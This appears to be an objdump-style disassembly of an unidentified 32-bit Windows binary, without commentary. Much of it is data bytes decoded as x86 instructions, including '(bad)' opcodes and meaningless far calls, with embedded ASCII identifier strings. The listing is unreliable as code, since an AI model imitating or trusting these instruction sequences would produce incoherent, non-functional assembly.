  4231ad:	add    BYTE PTR [ebx-0x4293427d],dl
  4231b3:	jle    0x423188
  4231b5:	call   DWORD PTR [eax-0x20]
  4231b8:	cli    
  4231b9:	call   0xddd9:0xca398606
  4231c0:	add    DWORD PTR [eax],eax
  4231c2:	pop    esp
  4231c3:	add    BYTE PTR [eax],al
  4231c5:	add    BYTE PTR [ebp+0x0],cl
  4231c8:	and    BYTE PTR [edx-0x172300e1],al
  4231ce:	add    dh,ah
  4231d0:	fdiv   st(6),st
  4231d2:	inc    eax
  4231d3:	retf   
  4231d4:	neg    DWORD PTR [esi+0x72052337]
  4231da:	retf   
  4231db:	add    DWORD PTR [ebp+0x5c],ebx
  4231de:	push   edi
  4231df:	push   ds
  4231e0:	outs   dx,BYTE PTR ds:[esi]
  4231e1:	dec    edx
  4231e2:	pushf  
  4231e3:	in     eax,0x0
  4231e5:	mov    edi,0xc8e94cf5
  4231ea:	push   ebx
  4231eb:	stos   BYTE PTR es:[edi],al
  4231ec:	cmp    ebx,edi
  4231ee:	icebp  
  4231ef:	adc    BYTE PTR [eax],bh
  4231f1:	aaa    
  4231f2:	dec    esp
  4231f3:	adc    eax,DWORD PTR [ecx-0x340f4aa1]
  4231f9:	std    
  4231fa:	dec    edi
  4231fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231fc:	sub    BYTE PTR [esi+0x4b657782],0x8e
  423203:	lahf   
  423204:	arpl   WORD PTR [ebx],ax
  423206:	jb     0x4231a3
  423208:	ss push ebx
  42320a:	push   es
  42320b:	and    eax,0xafa9d26f
  423210:	ss add eax,0xeaaa17b8
  423216:	repz mov eax,0xec0759f9
  42321c:	mov    DWORD PTR [eax],edi
  42321e:	cs mov edx,0x4053
	...
  42322c:	add    BYTE PTR [eax],al
  42322e:	(bad)  
  423230:	test   eax,0xddffeef7
  423236:	and    al,0x1
  423238:	pop    ebp
  423239:	dec    edi
  42323a:	lods   al,BYTE PTR ds:[esi]
  42323b:	pop    esp
  42323c:	scas   al,BYTE PTR es:[edi]
  42323d:	repnz xor eax,0x5c0001de
  423243:	add    BYTE PTR [eax],al
  423245:	add    BYTE PTR [ebx],bh
  423247:	stc    
  423248:	ret    
  423249:	pop    ebp
  42324a:	pusha  
  42324b:	xor    BYTE PTR [esi-0x4f],dl
  42324e:	into   
  42324f:	sub    al,0x8d
  423251:	mov    ecx,esi
  423253:	xchg   edx,eax
  423254:	pop    esi
  423255:	repz fsubr QWORD PTR ds:0x40e09232
  42325c:	jp     0x4232c2
  42325e:	repnz sbb ebx,DWORD PTR [ecx]
  423261:	lea    ebp,[ecx+0x4d96ff06]
  423267:	adc    BYTE PTR [ebx+0x51fe96c1],0xdb
  42326e:	rol    BYTE PTR [edx+0x50],0xfa
  423272:	add    bh,cl
  423274:	in     eax,dx
  423275:	xchg   ebp,eax
  423276:	ror    BYTE PTR [esi],1
  423278:	bound  ebx,QWORD PTR [ebp+ebp*4+0x62]
  42327c:	xor    dh,bl
  42327e:	das    
  42327f:	ss mov dh,0x7d
  423282:	xchg   ebp,eax
  423283:	push   0x5a327eb3
  423288:	cld    
  423289:	retf   
  42328a:	ret    
  42328b:	xor    BYTE PTR [eax-0x69],bh
  42328e:	dec    edx
  42328f:	adc    eax,0xa63b27c4
  423294:	call   0x34ae:0xed7b85f9
  42329b:	sbb    eax,0x69664862
  4232a0:	xchg   ebp,eax
  4232a1:	stos   BYTE PTR es:[edi],al
	...
  4232ae:	outs   dx,DWORD PTR ds:[esi]
  4232af:	mov    ds:0x7edd2ad4,al
  4232b4:	jmp    edi
  4232b6:	push   edx
  4232b7:	fcmovu st,st(5)
  4232b9:	in     eax,0xca
  4232bb:	xor    DWORD PTR [eax+0x1de91bb],ebp
  4232c1:	add    BYTE PTR [eax+eax*1+0x0],bl
  4232c5:	add    BYTE PTR [ebx],ah
  4232c7:	mov    eax,0xbaac1b07
  4232cc:	stc    
  4232cd:	arpl   WORD PTR [ebx+0x3b],ax
  4232d0:	jne    0x4232dc
  4232d2:	pop    eax
  4232d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232d4:	pop    ebp
  4232d5:	push   0xc305f0e6
  4232da:	dec    ebx
  4232db:	mov    ecx,0x64bab752
  4232e0:	stc    
  4232e1:	ins    DWORD PTR es:[edi],dx
  4232e2:	xchg   BYTE PTR [ecx-0x78],al
  4232e5:	push   edx
  4232e6:	out    dx,al
  4232e7:	dec    ebx
  4232e8:	inc    esi
  4232e9:	mov    edx,0xce6f360c
  4232ee:	pop    edx
  4232ef:	ja     0x4232da
  4232f1:	push   0xd1e8b312
  4232f6:	fiadd  DWORD PTR ds:0x97522af8
  4232fc:	dec    edi
  4232fd:	jae    0x423324
  4232ff:	ss fs mov dh,0xd4
  423303:	cli    
  423304:	scas   al,BYTE PTR es:[edi]
  423305:	repz pop eax
  423307:	ins    DWORD PTR es:[edi],dx
  423308:	mov    edx,DWORD PTR [edx]
  42330a:	sub    al,BYTE PTR [esi-0x4]
  42330d:	mov    ecx,0x262b67a7
  423312:	adc    edi,ebp
  423314:	jno    0x42329f
  423316:	sub    al,0x6a
  423318:	sbb    edx,DWORD PTR [ebp-0x15]
  42331b:	cs inc esi
  42331d:	hlt    
  42331e:	xchg   eax,ebp
  423320:	daa    
  423321:	call   0x423326
	...
  42332e:	stc    
  42332f:	sbb    al,al
  423331:	inc    esi
  423332:	jecxz  0x423312
  423334:	(bad)  
  423335:	mov    edi,0xe1f1bc83
  42333a:	xor    BYTE PTR [eax-0x21123194],0x1
  423341:	add    BYTE PTR [eax+eax*1+0x0],bl
  423345:	add    dl,dh
  423347:	xor    al,0x80
  423349:	(bad)  
  42334a:	std    
  42334b:	mov    bl,0xb7
  42334d:	out    0x0,eax
  42334f:	(bad)  
  423350:	xchg   ebx,eax
  423351:	adc    DWORD PTR [ecx-0x52],esp
  423354:	cmp    bh,BYTE PTR [ebp+0x1ff8efdf]
  42335a:	fcom   DWORD PTR [edx-0x3c83f612]
  423360:	dec    eax
  423361:	xchg   esp,eax
  423362:	mov    ecx,cs
  423364:	cmc    
  423365:	repnz xchg ecx,eax
  423367:	(bad)  
  423368:	icebp  
  423369:	lock jbe 0x423384
  42336c:	or     esp,DWORD PTR [ecx]
  42336e:	imul   esp,DWORD PTR [ecx+0x2c3e71e],0x5a42e710
  423378:	fnsave [ebx+0x61]
  42337b:	jge    0x42331e
  42337d:	retf   
  42337e:	xor    bh,BYTE PTR [ecx+esi*1+0x1c902315]
  423385:	xor    eax,ecx
  423387:	mov    DWORD PTR [edx],ebx
  423389:	stos   BYTE PTR es:[edi],al
  42338a:	into   
  42338b:	pop    esi
  42338c:	ds mov ebx,0x9757393a
  423392:	cmp    BYTE PTR gs:[esi+0xa4d907d],cl
  423399:	shl    bh,0x3a
  42339c:	push   ds
  42339d:	push   0x39
  42339f:	mov    ds:0xed27,eax
	...
  4233ac:	add    BYTE PTR [eax],al
  4233ae:	mov    eax,ds:0x3e8336b9
  4233b3:	(bad)  
  4233b4:	mov    ch,0xbb
  4233b6:	icebp  
  4233b7:	and    eax,0xae788c27
  4233bc:	pop    dx
  4233be:	dec    ecx
  4233bf:	fild   WORD PTR [ecx]
  4233c1:	add    BYTE PTR [eax+eax*1+0x0],bl
  4233c5:	add    BYTE PTR [esi+0x7e],cl
  4233c8:	enter  0x509f,0x51
  4233cc:	ja     0x4233a4
  4233ce:	aad    0x4a
  4233d0:	pushaw 
  4233d2:	call   0x62a854dc
  4233d7:	inc    esi
  4233d8:	pop    ebx
  4233d9:	repnz (bad) [eax+0x5da72e03]
  4233e0:	mov    ebp,edx
  4233e2:	ffree  st(7)
  4233e4:	shr    DWORD PTR [esi],1
  4233e6:	fadd   QWORD PTR [ebx]
  4233e8:	daa    
  4233e9:	stos   BYTE PTR es:[edi],al
  4233ea:	cld    
  4233eb:	pop    ebp
  4233ec:	mov    ecx,0xfd6e73ca
  4233f1:	push   edx
  4233f2:	lahf   
  4233f3:	ds dec esp
  4233f5:	xor    BYTE PTR cs:[edi],ch
  4233f8:	aaa    
  4233f9:	or     al,0x5f
  4233fb:	or     bl,BYTE PTR ss:[edx+0x12]
  4233ff:	pushf  
  423400:	pop    ebp
  423401:	add    BYTE PTR [ebx+0x53dba46c],bl
  423407:	xchg   edi,eax
  423408:	mov    bl,0xd0
  42340a:	retf   0xd5
  42340d:	repnz outs dx,BYTE PTR ds:[esi]
  42340f:	daa    
  423410:	rol    DWORD PTR ds:0x5f6d5277,cl
  423416:	cld    
  423417:	xchg   esp,eax
  423418:	jb     0x423437
  42341a:	xchg   edi,eax
  42341b:	push   edi
  42341c:	test   al,0xe1
  42341e:	cld    
  42341f:	jmp    0x0:0x868
	...
  42342e:	adc    dl,bh
  423430:	repz or esi,edi
  423433:	das    
  423434:	cli    
  423435:	fist   WORD PTR [ecx]
  423437:	dec    ebx
  423438:	es nop
  42343a:	mov    ds:0xa5ea1284,eax
  42343f:	fild   WORD PTR [ecx]
  423441:	add    BYTE PTR [eax+eax*1+0x0],bl
  423445:	add    BYTE PTR [edx],ah
  423447:	mov    esp,DWORD PTR [ebx]
  423449:	jg     0x4234a4
  42344b:	jmp    ecx
  42344d:	shr    DWORD PTR [eax+0x30],0x4c
  423451:	xlat   BYTE PTR ds:[ebx]
  423452:	add    al,BYTE PTR [eax]
  423454:	idiv   ch
  423456:	cmp    BYTE PTR [ecx],al
  423458:	inc    eax
  423459:	dec    esi
  42345a:	imul   esp,edi,0xae7fee3a
  423460:	xlat   BYTE PTR ds:[ebx]
  423461:	and    al,0x41
  423463:	sbb    eax,0x18283256
  423468:	pop    es
  423469:	add    al,0xca
  42346b:	and    ebx,eax
  42346d:	or     DWORD PTR [ecx+0x14f4b7b4],ebx
  423473:	into   
  423474:	lock jge 0x4234ea
  423477:	mov    ds:0x79cec177,al
  42347c:	call   0xceb0:0xf781760
  423483:	pop    ebp
  423484:	mov    eax,0x28f6c85c
  423489:	push   ds
  42348a:	or     al,0x18
  42348c:	and    al,dl
  42348e:	push   0x7573f14
  423493:	xlat   BYTE PTR ds:[ebx]
  423494:	jp     0x4234a4
  423496:	out    0xc4,ax
  423499:	jns    0x42348e
  42349b:	xchg   ebp,eax
  42349c:	ja     0x423514
  42349e:	and    ah,BYTE PTR [edx+0x54]
  4234a1:	push   eax
	...
  4234ae:	add    al,al
  4234b0:	inc    edx
  4234b1:	add    BYTE PTR [eax+eax*8],al
  4234b4:	inc    edx
  4234b5:	add    BYTE PTR [eax],cl
  4234b7:	rol    BYTE PTR [edx+0x0],0xc
  4234bb:	rol    BYTE PTR [edx+0x0],0x10
  4234bf:	rol    BYTE PTR [edx+0x0],0x14
  4234c3:	rol    BYTE PTR [edx+0x0],0x18
  4234c7:	rol    BYTE PTR [edx+0x0],0x1c
  4234cb:	rol    BYTE PTR [edx+0x0],0x57
  4234cf:	inc    edi
  4234d0:	cmp    DWORD PTR [edi+0x41],ebx
  4234d3:	pop    eax
  4234d4:	ss push esi
  4234d6:	pop    edi
  4234d7:	cmp    BYTE PTR [eax],al
  4234d9:	inc    ebx
  4234da:	inc    ebp
  4234db:	dec    esp
  4234dc:	pop    edi
  4234dd:	pop    eax
  4234de:	push   edi
  4234df:	dec    eax
  4234e0:	inc    edx
  4234e1:	add    BYTE PTR [edi+0x50],dl
  4234e4:	xor    eax,0x4641365f
  4234e9:	cmp    DWORD PTR [edx],esi
  4234eb:	xor    ebx,DWORD PTR [edi+0x32]
  4234ee:	aaa    
  4234ef:	add    BYTE PTR [eax+0x48],dl
  4234f2:	xor    BYTE PTR [edi+0x58],bl
  4234f5:	push   esp
  4234f6:	inc    ecx
  4234f7:	dec    ebp
  4234f8:	push   ecx
  4234f9:	pop    edi
  4234fa:	inc    esi
  4234fb:	push   ebp
  4234fc:	cmp    DWORD PTR [eax],eax
  4234fe:	push   edi
  4234ff:	push   ebp
  423500:	inc    ecx
  423501:	xor    dh,BYTE PTR [ebx]
  423503:	xor    ebx,DWORD PTR [edi+0x4e]
  423506:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42350a:	cmp    DWORD PTR [edi+0x38],ebx
  42350d:	dec    ecx
  42350e:	cmp    DWORD PTR [edx+0x36],ebx
  423511:	pop    edi
  423512:	dec    edx
  423513:	xor    BYTE PTR [edx+0x34],cl
  423516:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42351a:	xor    esi,DWORD PTR [eax]
  42351c:	pop    edi
  42351d:	inc    edx
  42351e:	dec    ebx
  42351f:	pop    eax
  423520:	pop    eax
  423521:	xor    eax,0x51414d00
  423526:	pop    edi
  423527:	inc    ecx
  423528:	xor    al,BYTE PTR [ebp+0x5f]
  42352b:	inc    ecx
  42352c:	dec    ebx
  42352d:	cmp    DWORD PTR ds:0x5a003939,esi
  423533:	inc    ebp
  423534:	cmp    BYTE PTR [edi+0x4d],bl
  423537:	ss dec eax
  423539:	dec    ebx
  42353a:	add    BYTE PTR [ebp+0x57],al
  42353d:	xor    DWORD PTR [edi+0x31],ebx
  423540:	dec    ebx
  423541:	xor    eax,DWORD PTR [ecx+0x30]
  423544:	push   ebx
  423545:	add    BYTE PTR [edx+esi*1+0x36],al
  423549:	aaa    
  42354a:	pop    edi
  42354b:	push   edx
  42354c:	dec    eax
  42354d:	dec    ebp
  42354e:	cmp    BYTE PTR [edi+0x37],bl
  423551:	inc    esi
  423552:	xor    eax,0x43355500
  423557:	pop    edi
  423558:	pop    ecx
  423559:	dec    ecx
  42355a:	push   ebx
  42355b:	xor    bl,BYTE PTR [edi+0x52]
  42355e:	add    BYTE PTR [eax+0x55],dl
  423561:	dec    ecx
  423562:	xor    BYTE PTR [edi+0x43],bl
  423565:	ss inc ebp
  423567:	xor    bl,BYTE PTR [edi+0x4d]
  42356a:	xor    al,0x4a
  42356c:	push   edx
  42356d:	push   ebp
  42356e:	add    BYTE PTR [esi+0x39],cl
  423571:	push   eax
  423572:	pop    edi
  423573:	push   ebp
  423574:	cmp    DWORD PTR [esi],esi
  423576:	xor    BYTE PTR [ecx],dh
  423578:	pop    edi
  423579:	dec    edi
  42357a:	dec    esi
  42357b:	push   esp
  42357c:	cmp    BYTE PTR [eax],al
  42357e:	dec    esp
  42357f:	xor    al,0x44
  423581:	xor    DWORD PTR [edi+0x4b],ebx
  423584:	xor    DWORD PTR [ebp+0x5f],eax
  423587:	pop    edx
  423588:	add    BYTE PTR [edi+esi*1+0x43],dl
  42358c:	pop    edi
  42358d:	inc    edx
  42358e:	xor    dh,BYTE PTR [ecx]
  423590:	push   ebx
  423591:	xor    DWORD PTR [ecx],edi
  423593:	inc    edx
  423594:	add    BYTE PTR [edi+0x45],al
  423597:	xor    al,0x38
  423599:	xor    BYTE PTR [eax],dh
  42359b:	pop    edi
  42359c:	dec    edx
  42359d:	dec    ebx
  42359e:	xor    eax,0x33345f4d
  4235a3:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4235a7:	pop    edi
  4235a8:	aaa    
  4235a9:	push   esi
  4235aa:	dec    ebx
  4235ab:	push   edx
  4235ac:	pop    edi
  4235ad:	inc    ebx
  4235ae:	add    BYTE PTR [edx+0x35],bl
  4235b1:	dec    ebp
  4235b2:	pop    edi
  4235b3:	inc    edi
  4235b4:	dec    esi
  4235b5:	xor    al,0x49
  4235b7:	xor    eax,0x54590035
  4235bc:	push   edx
  4235bd:	pop    edi
  4235be:	push   esp
  4235bf:	inc    ebx
  4235c0:	inc    ecx
  4235c1:	pop    edi
  4235c2:	cmp    DWORD PTR [ecx+0x41],ebx
  4235c5:	push   ebp
  4235c6:	pop    edi
  4235c7:	push   ebp
  4235c8:	inc    ebp
  4235c9:	add    BYTE PTR [esi+esi*1+0x35],cl
  4235cd:	pop    edi
  4235ce:	pop    eax
  4235cf:	dec    edx
  4235d0:	inc    edx
  4235d1:	inc    edi
  4235d2:	add    BYTE PTR [edx+0x36],al
  4235d5:	inc    ebx
  4235d6:	pop    edi
  4235d7:	xor    BYTE PTR ds:0x36464b,dh
  4235dd:	dec    ebx
  4235de:	cmp    DWORD PTR [esi+0x37],eax
  4235e1:	xor    ebx,DWORD PTR [edi+0x35]
  4235e4:	ss inc edi
  4235e6:	pop    ecx
  4235e7:	dec    eax
  4235e8:	pop    ecx
  4235e9:	add    BYTE PTR [ebp+0x35],cl
  4235ec:	push   eax
  4235ed:	xor    BYTE PTR [edi+0x4f],bl
  4235f0:	pop    ecx
  4235f1:	xor    cl,BYTE PTR [edi+0x0]
  4235f4:	pop    ecx
  4235f5:	xor    DWORD PTR [esi+0x5f],ecx
  4235f8:	xor    al,BYTE PTR [edx+0x30]
  4235fb:	push   esi
  4235fc:	push   esp
  4235fd:	inc    ebp
  4235fe:	add    BYTE PTR [edi+0x37],al
  423601:	push   esi
  423602:	xor    DWORD PTR [edi+0x49],ebx
  423605:	xor    al,BYTE PTR [esi+0x30]
  423608:	pop    edi
  423609:	ss dec esi
  42360b:	cmp    BYTE PTR [eax],al
  42360d:	pop    edx
  42360e:	xor    eax,0x445f334b
  423613:	xor    BYTE PTR [eax],bh
  423615:	push   ecx
  423616:	push   esi
  423617:	xor    al,0x0
  423619:	push   ebp
  42361a:	pop    eax
  42361b:	inc    edi
  42361c:	xor    DWORD PTR [edi+0x39],ebx
  42361f:	push   esp
  423620:	inc    ebx
  423621:	aaa    
  423622:	inc    esp
  423623:	add    BYTE PTR [edi+0x39],dl
  423626:	ss pop edi
  423628:	dec    eax
  423629:	pop    edx
  42362a:	pop    ecx
  42362b:	inc    edi
  42362c:	push   ebp
  42362d:	pop    edi
  42362e:	push   eax
  42362f:	dec    eax
  423630:	inc    ebx
  423631:	add    BYTE PTR [ebp+0x0],dl
  423634:	xor    al,0x0
  423636:	dec    edi
  423637:	add    BYTE PTR [edi+0x0],bl
  42363a:	cmp    BYTE PTR [eax],al
  42363c:	xor    al,BYTE PTR [eax]
  42363e:	inc    ebx
  42363f:	add    BYTE PTR [edx+0x0],bl
  423642:	inc    ebx
  423643:	add    BYTE PTR [edi],dh
  423645:	add    BYTE PTR [edi+0x0],bl
  423648:	inc    ebx
  423649:	add    BYTE PTR [eax+eax*1+0x0],al
  42364d:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423651:	add    BYTE PTR [edx],dh
  423653:	add    BYTE PTR [edi+0x0],bl
  423656:	cmp    BYTE PTR [eax],al
  423658:	dec    esp
  423659:	add    BYTE PTR [esi+0x0],dl
  42365c:	pop    edi
  42365d:	add    BYTE PTR [ecx+0x0],bl
  423660:	push   edx
  423661:	add    BYTE PTR [esi+0x0],dl
  423664:	xor    al,BYTE PTR [eax]
  423666:	cmp    BYTE PTR [eax],al
  423668:	pop    edi
  423669:	add    BYTE PTR [edx+0x0],cl
  42366c:	add    BYTE PTR [eax],al
  42366e:	inc    edx
  42366f:	add    BYTE PTR [eax+eax*1+0x46],cl
  423673:	add    BYTE PTR [edi+0x0],bl
  423676:	xor    eax,DWORD PTR [eax]
  423678:	inc    ebp
  423679:	add    BYTE PTR [ecx+0x0],cl
  42367c:	push   edx
  42367d:	add    BYTE PTR [ecx],bh
  42367f:	add    BYTE PTR [esi+0x0],dl
  423682:	add    BYTE PTR [eax],al
  423684:	dec    ebp
  423685:	add    BYTE PTR [edi],dh
  423687:	add    BYTE PTR [eax+eax*1+0x5f],al
  42368b:	add    BYTE PTR [edx+0x0],cl
  42368e:	pop    eax
  42368f:	add    BYTE PTR [ebx],dh
  423691:	add    BYTE PTR [ecx],dh
  423693:	add    BYTE PTR [ebx+0x0],al
  423696:	add    BYTE PTR [eax],al
  423698:	dec    edi
  423699:	add    BYTE PTR [esi],dh
  42369b:	add    BYTE PTR [eax+0x0],cl
  42369e:	pop    edi
  42369f:	add    BYTE PTR [eax],dh
  4236a1:	add    BYTE PTR [edi],dh
  4236a3:	add    BYTE PTR [ecx],dh
  4236a5:	add    BYTE PTR [edx+0x0],dl
  4236a8:	xor    eax,0x55000000
  4236ad:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4236b1:	add    BYTE PTR [edi+0x0],bl
  4236b4:	push   esp
  4236b5:	add    BYTE PTR [ecx+0x0],al
  4236b8:	cmp    DWORD PTR [eax],eax
  4236ba:	pop    edi
  4236bb:	add    BYTE PTR [ebx],dh
  4236bd:	add    BYTE PTR [eax],dh
  4236bf:	add    BYTE PTR [eax],bh
  4236c1:	add    BYTE PTR [edi+0x0],cl
  4236c4:	inc    ebx
  4236c5:	add    BYTE PTR ds:0x4d000000,dh
  4236cb:	add    BYTE PTR [esi+0x0],cl
  4236ce:	inc    ebp
  4236cf:	add    BYTE PTR [edi+0x0],bl
  4236d2:	push   esp
  4236d3:	add    BYTE PTR [esi+0x0],al
  4236d6:	cmp    BYTE PTR [eax],al
  4236d8:	push   ebx
  4236d9:	add    BYTE PTR [edx+0x0],bl
  4236dc:	pop    edi
  4236dd:	add    BYTE PTR [eax],dh
  4236df:	add    BYTE PTR [eax],bh
  4236e1:	add    BYTE PTR [eax+0x0],cl
  4236e4:	add    BYTE PTR [eax],al
  4236e6:	dec    esi
  4236e7:	add    BYTE PTR [edi+0x0],cl
  4236ea:	pop    edx
  4236eb:	add    BYTE PTR [edi+0x0],bl
  4236ee:	add    BYTE PTR ss:[ecx+0x0],bl
  4236f2:	dec    ebp
  4236f3:	add    BYTE PTR [esi],dh
  4236f5:	add    BYTE PTR [ebx],dh
  4236f7:	add    BYTE PTR [edi+0x0],bl
  4236fa:	xor    al,0x0
  4236fc:	dec    esi
  4236fd:	add    BYTE PTR [edx],dh
  4236ff:	add    BYTE PTR [esi],dh
  423701:	add    BYTE PTR [ecx],dh
  423703:	add    BYTE PTR [eax],al
  423705:	add    BYTE PTR [ebx+0x0],cl
  423708:	dec    eax
  423709:	add    BYTE PTR [eax],bh
  42370b:	add    BYTE PTR [edi+0x0],bl
  42370e:	inc    esi
  42370f:	add    BYTE PTR [esi+0x0],al
  423712:	push   esp
  423713:	add    BYTE PTR [edi],dh
  423715:	add    BYTE PTR [esi],dh
  423717:	add    BYTE PTR [edi+0x0],bl
  42371a:	dec    esp
  42371b:	add    BYTE PTR [ecx+0x0],bl
  42371e:	add    BYTE PTR [eax],al
  423720:	push   ebx
  423721:	add    BYTE PTR [ecx+0x0],bl
  423724:	xor    BYTE PTR [eax],al
  423726:	pop    edi
  423727:	add    BYTE PTR [ecx],bh
  423729:	add    BYTE PTR [edx+0x0],dl
  42372c:	dec    eax
  42372d:	add    BYTE PTR [ecx+0x0],bl
  423730:	xor    al,BYTE PTR [eax]
  423732:	pop    edi
  423733:	add    BYTE PTR [eax],dh
  423735:	add    BYTE PTR [eax],al
  423737:	add    BYTE PTR [edx+0x0],al
  42373a:	dec    edx
  42373b:	add    BYTE PTR [esi+0x0],cl
  42373e:	xor    al,BYTE PTR [eax]
  423740:	pop    edi
  423741:	add    BYTE PTR [eax+eax*1+0x33],cl
  423745:	add    BYTE PTR [edx+0x0],dl
  423748:	xor    al,0x0
  42374a:	dec    eax
  42374b:	add    BYTE PTR [eax],al
  42374d:	add    BYTE PTR [ebp+0x0],dl
  423750:	add    BYTE PTR ss:[ebp+0x0],cl
  423754:	xor    DWORD PTR [eax],eax
  423756:	pop    edi
  423757:	add    BYTE PTR [esi],dh
  423759:	add    BYTE PTR [ecx+0x0],bl
  42375c:	push   ebp
  42375d:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423761:	add    BYTE PTR [edi+0x0],cl
  423764:	inc    esp
  423765:	add    BYTE PTR [edi+0x0],dl
  423768:	push   ebx
  423769:	add    BYTE PTR [eax],al
  42376b:	add    BYTE PTR [edx+0x0],bl
  42376e:	inc    ebx
  42376f:	add    BYTE PTR [ebp+0x0],dl
  423772:	pop    edi
  423773:	add    BYTE PTR [ecx],dh
  423775:	add    BYTE PTR [ebp+0x0],al
  423778:	push   esp
  423779:	add    BYTE PTR [eax],dh
  42377b:	add    BYTE PTR [eax],al
  42377d:	add    BYTE PTR [eax],al
  42377f:	add    BYTE PTR [eax],al
  423781:	add    BYTE PTR [eax-0x7ffbffbe],al
  423787:	inc    edx
  423788:	add    BYTE PTR [eax],cl
  42378a:	add    BYTE PTR [edx+0x0],0xc
  42378e:	add    BYTE PTR [edx+0x0],0x10
  423792:	add    BYTE PTR [edx+0x0],0x14
  423796:	add    BYTE PTR [edx+0x0],0x18
  42379a:	add    BYTE PTR [edx+0x0],0x1c
  42379e:	add    BYTE PTR [edx+0x0],0x20
  4237a2:	add    BYTE PTR [edx+0x0],0x24
  4237a6:	add    BYTE PTR [edx+0x0],0x28
  4237aa:	add    BYTE PTR [edx+0x0],0x0
  4237ae:	add    BYTE PTR [eax],al
  4237b0:	add    BYTE PTR [eax],al
  4237b2:	add    BYTE PTR [eax],al
  4237b4:	xor    ebx,DWORD PTR [edi]
  4237b6:	ja     0x423805
  4237b8:	add    BYTE PTR [eax],al
  4237ba:	add    BYTE PTR [eax],al
  4237bc:	loop   0x4237f5
  4237be:	add    al,BYTE PTR [eax]
  4237c0:	add    DWORD PTR [eax],eax
  4237c2:	add    BYTE PTR [eax],al
  4237c4:	add    DWORD PTR [eax],eax
  4237c6:	add    BYTE PTR [eax],al
  4237c8:	add    DWORD PTR [eax],eax
  4237ca:	add    BYTE PTR [eax],al
  4237cc:	fdiv   DWORD PTR [edi]
  4237ce:	add    al,BYTE PTR [eax]
  4237d0:	fdiv   QWORD PTR [edi]
  4237d2:	add    al,BYTE PTR [eax]
  4237d4:	loopne 0x42380d
  4237d6:	add    al,BYTE PTR [eax]
  4237d8:	daa    
  4237d9:	mov    BYTE PTR [eax],al
  4237db:	add    dh,ch
  4237dd:	aaa    
  4237de:	add    al,BYTE PTR [eax]
  4237e0:	add    BYTE PTR [eax],al
  4237e2:	push   edi
  4237e3:	outs   dx,DWORD PTR ds:[esi]
  4237e4:	jb     0x42384a
  4237e6:	push   edi
  4237e7:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4237ee:	aas    
  4237ef:	inc    ebp
  4237f0:	outs   dx,BYTE PTR ds:[esi]
  4237f1:	jne    0x423860
  4237f3:	push   edi
  4237f4:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4237fb:	popa   
  4237fc:	je     0x423867
  4237fe:	outs   dx,DWORD PTR ds:[esi]
  4237ff:	outs   dx,BYTE PTR ds:[esi]
  423800:	jae    0x423855
  423802:	je     0x423865
  423804:	.byte 0x74
